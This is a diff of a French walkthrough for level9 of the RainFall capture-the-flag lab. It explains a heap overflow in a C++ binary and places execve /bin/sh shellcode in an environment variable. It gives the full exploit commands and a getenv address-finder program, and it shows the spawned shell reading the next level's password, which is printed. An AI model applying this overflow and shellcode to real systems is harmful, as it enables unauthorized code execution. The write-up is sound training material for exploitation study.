@@ -1,25 +1,30 @@
-Nous trouvons des appelles de librairie exterieur
+Dans ce binaire il y a deux malloc de deux deux classes. Puis la function _ZN1N13setAnnotationEPc va copier arg[1] dans la premiere classe creee sans verifier la taille de cette clase. De plus dans le code il y a un "call" via edx. eax est attribuee par une value sur la satck [esp + 0x10],eax = [esp + 0x10], la valeur de eax doit etre une adresse car edx = *eax ! Ce edx est l'adresse du deuxieme malloc (2e classe).
+Le second malloc se trouvant apres le premier sur la stack il est possible de l'overflow.
+La function _ZN1N13setAnnotationEPc va ecrire dans la (char *)classe + 0x4, et on veut ecraser classe2. offset = classe2 - (char *)classe + 0x4 = 0x804a078 - 0x804a008 + 0x4 = 0x6c
+On a notre offset: 0x6c
+N'oublions pas qu'il faut faire pointer cette value vers une autre adresse qui pointera vers le shellcode. J'ai decide de mettre l'adresse et le shellcode dans l'environement.
 
-./level9:     file format elf32-i386
+[ADDR1]	=>	[ADDR1 + 0x4][SHELLCODE]
+Class2		  X +0x00	 X + 0x04
 
-DYNAMIC RELOCATION RECORDS
-OFFSET   TYPE              VALUE
-08049b40 R_386_GLOB_DAT    __gmon_start__
-08049b80 R_386_COPY        _ZTVN10__cxxabiv117__class_type_infoE
-08049b50 R_386_JUMP_SLOT   __cxa_atexit
-08049b54 R_386_JUMP_SLOT   __gmon_start__
-08049b58 R_386_JUMP_SLOT   _ZNSt8ios_base4InitC1Ev
-08049b5c R_386_JUMP_SLOT   __libc_start_main
-08049b60 R_386_JUMP_SLOT   _exit
-08049b64 R_386_JUMP_SLOT   _ZNSt8ios_base4InitD1Ev
-08049b68 R_386_JUMP_SLOT   memcpy
-08049b6c R_386_JUMP_SLOT   strlen
-08049b70 R_386_JUMP_SLOT   _Znwo
+USER=$(python -c 'print "\x30\xf9\xff\xbf\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')
+
+Maintenant il faut recuperer l'adresse de notre shellcode.
+avec notre programme getenv.
+Car l'adresse de l'environement change selon la taille du nom du binaire lancee.
+	./a.out USER ./level9
+	USER will be at 0xbffff952
+
+Donc on modifie notre shellcode pour que l'adresse pointe a 4 octets pour pointer sur le shellcode.
+
+	level9@RainFall:~$ USER=$(python -c 'print "\x56\xf9\xff\xbf\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')
+
+Maintenant que notre environnement est bon, on peut pointer notre overflow sur celui-ci (0xbffff952) 
+	level9@RainFall:~$ ./level9 $(python -c 'print "."*108 + "\x52\xf9\xff\xbf"')
+
+BINGO !!!!!!!!!!!!!
 
 
-
-
-r $(python -c 'print "."*108 + "\xe2\xf8\xff\xbf"')j
 
 
 level9@RainFall:~$ USER=$(python -c 'print "\x30\xf9\xff\xbf\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')
@@ -29,3 +34,19 @@ level9@RainFall:~$ USER=$(python -c 'print "\x56\xf9\xff\xbf\x31\xc0\x50\x68\x2f
 level9@RainFall:~$ ./level9 $(python -c 'print "."*108 + "\x52\xf9\xff\xbf"')
 $ cat /home/user/bonus0/.pass
 f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+
+getenv:
+
+
+int main(int argc, char *argv[])
+{
+	char *ptr;
+	if (argc < 3){
+	printf("Usage %s <environement var> <target program name>\n", argv[0]);
+	exit (0);
+	}
+	ptr = getenv(argv[1]);
+	ptr += (strlen(argv[0]) - strlen(argv[2]))*2;
+	printf("%s will be at %p\n",argv[1], ptr);
+	return 0;
+}
